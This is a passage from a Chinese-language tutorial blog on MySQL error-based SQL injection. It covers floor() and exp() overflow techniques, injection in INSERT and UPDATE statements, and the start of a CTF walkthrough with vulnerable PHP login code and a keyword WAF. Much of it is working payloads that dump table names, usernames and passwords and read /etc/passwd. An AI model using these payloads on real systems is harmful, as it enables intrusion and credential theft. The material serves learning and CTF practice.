<span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()))a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)b)<span class="hljs-comment">--+  #第二种</span>

?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))x from information_schema.tables group by x)b)--+</span>
<span class="hljs-string"></span>
<span class="hljs-string">uname=hybcx&amp;passwd=1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x7e</span>,password)<span class="hljs-keyword">from</span> users),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x#<span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit   #第三种</code></pre>
<p>只需将上面模板中的内容替换成为我们的查询payload即可，a与b均是字段别名</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215165205920.png" alt="image-20231215165205920"></p>
<h1 id="0x03-exp函数报错注入">0x03 EXP函数报错注入</h1>
<ul>
<li>作用：计算以e为底的幂值</li>
<li>语法：exp（X）</li>
<li>报错原理：当参数X超过了710之后，exp函数就会报错。</li>
</ul>
<p>MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215165453272.png" alt="image-20231215165453272"></p>
<p>该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215165519117.png" alt="image-20231215165519117"></p>
<p>除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。</p>
<ul>
<li>使用版本：MySQL5.5.5 及以上版本</li>
</ul>
<p>现在我们已经知道当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误。那么我们在实际利用中如何让 exp() 报错的同时返回我们想要得到的数据呢？</p>
<p>我们可以用 <code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215165845068.png" alt="image-20231215165845068"></p>
<p>如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL&gt;=5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错：</p>
<p>下面由于实操的时候在安装MySQL低版本总是报错，我就直接照搬了（见谅~）</p>
<h2 id="注出数据">注出数据</h2>
<ul>
<li>得到表名：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span>flag,users<span class="hljs-string">' from dual)))'</span></code></pre>
<ul>
<li>得到列名：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">'users'</span>)x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span>id,username,password<span class="hljs-string">' from dual)))'</span></code></pre>
<ul>
<li>检索数据：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(id, <span class="hljs-number">0x7c</span>, username, <span class="hljs-number">0x7c</span>, password) <span class="hljs-keyword">from</span> users)x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span><span class="hljs-number">1</span><span class="hljs-operator">|</span>admin<span class="hljs-operator">|</span><span class="hljs-number">123456</span>,<span class="hljs-number">2</span><span class="hljs-operator">|</span>whoami<span class="hljs-operator">|</span><span class="hljs-number">657260</span>,<span class="hljs-number">3</span><span class="hljs-operator">|</span>bunny<span class="hljs-operator">|</span><span class="hljs-number">864379</span><span class="hljs-string">' from dual)))'</span></code></pre>
<ul>
<li>读取文件（有13行的限制）：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">'/etc/passwd'</span>))x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span>root:x:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:<span class="hljs-operator">/</span>root:<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>bash
daemon:x:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:daemon:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
bin:x:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:bin:<span class="hljs-operator">/</span>bin:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
sys:x:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:sys:<span class="hljs-operator">/</span>dev:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
sync:x:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:sync:<span class="hljs-operator">/</span>bin:<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>sync
games:x:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:games:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>games:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
man:x:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:man:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>cache<span class="hljs-operator">/</span>man:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
lp:x:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:lp:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>lpd:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
mail:x:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:mail:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>mail:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
news:x:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:news:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>news:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
uucp:x:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:uucp:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>uucp:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
proxy:x:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:proxy:<span class="hljs-operator">/</span>bin:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
www<span class="hljs-operator">-</span>data:x:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www<span class="hljs-operator">-</span>data:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>www:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin<span class="hljs-string">' from dual)))'</span></code></pre>
<p>这个查询可以从当前的上下文中 dump 出所有的 tables 与 columns，我们也可以 dump 出所有的数据库，但由于我们是通过报错来获取，因此它返回的结果有限：</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span>`information_schema`.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span><span class="hljs-number">000</span>
ctf::flag::id
ctf::flag::flag
ctf::users::id
ctf::users::username
ctf::users::password<span class="hljs-string">' from dual)))'</span></code></pre>
<p>那对于这个payload我有所疑惑，因此我询问了GPT（其中的@符号的作用）</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x));</code></pre>
<p>在这个 SQL 查询语句中：</p>
<pre><code class="hljs sql">@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)</code></pre>
<p><code>@</code> 是一个用户变量，用于存储中间结果。在这里，<code>@</code> 的作用是在不同的步骤中保留中间拼接的字符串。</p>
<p>让我解释一下：</p>
<ol>
<li><code>@:=0</code>：这是一个初始化步骤，将用户变量 <code>@</code> 设置为零。</li>
<li><code>@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)</code>：在这一步，<code>concat</code> 函数用于将当前的 <code>@</code> 值与新的字符串拼接，然后将结果再次存储在 <code>@</code> 变量中。这样，<code>@</code> 变量逐渐被构建起来，包含了多次拼接的结果。</li>
</ol>
<p>实际上，这两个 <code>@</code> 符号是同一个用户变量，只是在不同的时刻被使用。第一个 <code>@</code> 是在初始化时使用，而后续的 <code>@</code> 是在拼接字符串时使用，用于保留中间结果。</p>
<h2 id="insert位置注入">Insert位置注入</h2>
<p>根据 Insert 位置的注入方式按部就班就好了。假设原来的插入语句如下：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'john'</span>,<span class="hljs-string">'679237'</span>);</code></pre>
<p>我们可以在 username 或 password 位置插入恶意的 exp() 语句进行报错注入，如下所示：</p>
<pre><code class="hljs sql"># 在username处插入: 
john<span class="hljs-string">' or exp(~(select * from(select user())x)),1);#, </span>
<span class="hljs-string">则sql语句为: </span>
<span class="hljs-string">insert into users(id,username,password) values(4,'</span>john<span class="hljs-string">' or exp(~(select * from(select user())x)),1);#'</span>,<span class="hljs-string">'679237'</span>);

mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'john'</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)),<span class="hljs-number">1</span>);#<span class="hljs-string">','</span><span class="hljs-number">679237</span><span class="hljs-string">');;</span>
<span class="hljs-string">ERROR 1690 (22003): DOUBLE value is out of range in '</span><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>((<span class="hljs-keyword">select</span> <span class="hljs-string">'root@localhost'</span> <span class="hljs-keyword">from</span> dual)))<span class="hljs-string">'</span></code></pre>
<p>爆出所有数据：</p>
<pre><code class="hljs sql"># 在username处插入: 
john<span class="hljs-string">' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#</span>
<span class="hljs-string"></span>
<span class="hljs-string">mysql&gt; insert into users(id,username,password) values(4,'</span>john<span class="hljs-string">' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#'</span>,<span class="hljs-string">'679237'</span>);
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span><span class="hljs-number">000</span>
ctf::flag::id
ctf::flag::flag
ctf::users::id
ctf::users::username
ctf::users::password<span class="hljs-string">' from dual)))'</span></code></pre>
<h2 id="update位置注入">Update位置注入</h2>
<p>根据 Update 位置的注入方式按部就班就好了。假设原来的插入语句如下：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">'new_value'</span> <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'admin'</span>;</code></pre>
<p>我们可以在 new_value 或后面的 where 子句处插入恶意的 exp() 语句进行报错注入，如下所示：</p>
<pre><code class="hljs sql"># 在new_value处插入: 
abc<span class="hljs-string">' or exp(~(select * from(select user())x))#, </span>
<span class="hljs-string">则sql语句为: update users set password='</span>abc<span class="hljs-string">' or exp(~(select * from(select user())x))# WHERE username = '</span>admin<span class="hljs-string">';</span>
<span class="hljs-string"></span>
<span class="hljs-string">mysql&gt; update users set password='</span>abc<span class="hljs-string">' or exp(~(select * from(select user())x));# WHERE username = '</span>admin<span class="hljs-string">';</span>
<span class="hljs-string">ERROR 1690 (22003): DOUBLE value is out of range in '</span><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>((<span class="hljs-keyword">select</span> <span class="hljs-string">'root@localhost'</span> <span class="hljs-keyword">from</span> dual)))<span class="hljs-string">'</span></code></pre>
<h2 id="exp-函数进行盲注">exp() 函数进行盲注</h2>
<p>有的登录逻辑会根据 sql 语句的报错与否返回不同的结果，如果我们可以控制这里得报错的话便可以进行盲注。下面我们通过一个 CTF 例题来进行详细探究。</p>
<h3 id="2021-虎符杯-ctf-finalweb-hatenum">2021 虎符杯 CTF Finalweb Hatenum</h3>
<p>进入题目是一个登录页面：（对我来说有点难度，只能基本抄wp了）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215173228030.png" alt="image-20231215173228030"></p>
<p>我们先分析一波题目给的源码</p>
<p>home.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">require_once</span>(<span class="hljs-string">'config.php'</span>);
<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]){
	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'location:index.php'</span>);
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]==<span class="hljs-string">'admin'</span>){
	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'/flag'</span>);
}
<span class="hljs-keyword">else</span>{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'hello '</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>];
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里说如果我们存储在session变量中的username=admin的话就给flag</p>
<p>config.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{
    <span class="hljs-comment">//数据库配置信息</span>
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">"localhost"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">"root"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span> = <span class="hljs-string">"123456"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span> = <span class="hljs-string">"ctf"</span>;
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-comment">//进行数据库连接</span>
		<span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;host,<span class="hljs-variable">$this</span>-&gt;user,<span class="hljs-variable">$this</span>-&gt;pass,<span class="hljs-variable">$this</span>-&gt;database);
		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'connect error'</span>);
		}
	}
    <span class="hljs-comment">//查询用户输入的用户名是否在数据库中</span>
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>)</span>{
		<span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"select * from users where username='<span class="hljs-subst">$username</span>'"</span>);
		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>){
			<span class="hljs-keyword">return</span> True;
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-keyword">return</span> False;
		}

	}
    <span class="hljs-comment">//注册功能部分</span>
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>{
		<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"insert into users (username,password,code) values ('<span class="hljs-subst">$username</span>','<span class="hljs-subst">$password</span>','<span class="hljs-subst">$code</span>')"</span>)){
			<span class="hljs-keyword">return</span> True;
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-keyword">return</span> False;
		}
	}
    <span class="hljs-comment">//如果查询到对应用户名，则成功登录</span>
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$code</span></span>)</span>{
		<span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"select * from users where username='<span class="hljs-subst">$username</span>' and password='<span class="hljs-subst">$password</span>'"</span>);
		<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;error){
			<span class="hljs-keyword">return</span> <span class="hljs-string">'error'</span>;
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-variable">$content</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();
			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$content</span>[<span class="hljs-string">'code'</span>]===<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>]){
				<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>] = <span class="hljs-variable">$content</span>[<span class="hljs-string">'username'</span>];
				<span class="hljs-keyword">return</span> <span class="hljs-string">'success'</span>;
			}
			<span class="hljs-keyword">else</span>{
				<span class="hljs-keyword">return</span> <span class="hljs-string">'fail'</span>;
			}
		}

	}
}

<span class="hljs-comment">//进行了很有力的过滤，不过没有过滤\与()</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i'</span>, <span class="hljs-variable">$str</span>)){
		<span class="hljs-keyword">die</span>(<span class="hljs-string">'Hack detected'</span>);
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\d{9}|0x[0-9a-f]{9}/i'</span>,<span class="hljs-variable">$str</span>)){
		<span class="hljs-keyword">die</span>(<span class="hljs-string">'Huge num detected'</span>);
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_waf</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span>{
	<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>)){
			<span class="hljs-title function_ invoke__">array_waf</span>(<span class="hljs-variable">$value</span>);
		}
		<span class="hljs-keyword">else</span>{
			<span class="hljs-title function_ invoke__">sql_waf</span>(<span class="hljs-variable">$value</span>);
			<span class="hljs-title function_ invoke__">num_waf</span>(<span class="hljs-variable">$value</span>);
		}
	}
}</code></pre>
<p>那我们重点关注一下sql语句部分</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231215174048617.png" alt="image-20231215174048617"></p>
<pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"select * from users where username='<span class="hljs-subst">$username</span>' and password='<span class="hljs-subst">$password</span>'"</span>);</code></pre>
<p>这里似乎可以构造万能密码，payload似乎与我之前刷的靶场思路一致</p>
<pre><code class="hljs sql">username<span class="hljs-operator">=</span>\
password<span class="hljs-operator">=</span><span class="hljs-operator">||</span><span class="hljs-number">1</span>#
<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">'(\'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">')||1#'</span>  括号内就是username的值，这样的话可以成功绕过</code></pre>
<p>但这里有一个验证码code无从得知，只能看wp了</p>
<p>所以我们的思路是使用 rlike（即regexp）按照之前regexp匹配注入的方法，将 code 匹配出来。我们又在 login 函数中注意到：</p>
<pre><code class="hljs plaintext">当使用正则匹配时，使用REGEXP和NOT REGEXP操作符(或RLIKE和NOT RLIKE，功能是一样的)
LIKE要全部匹配才返回1，而RLIKE和REGEXP则是部分匹配即可返回1。</code></pre>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'abcd'</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'a'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------+</span>
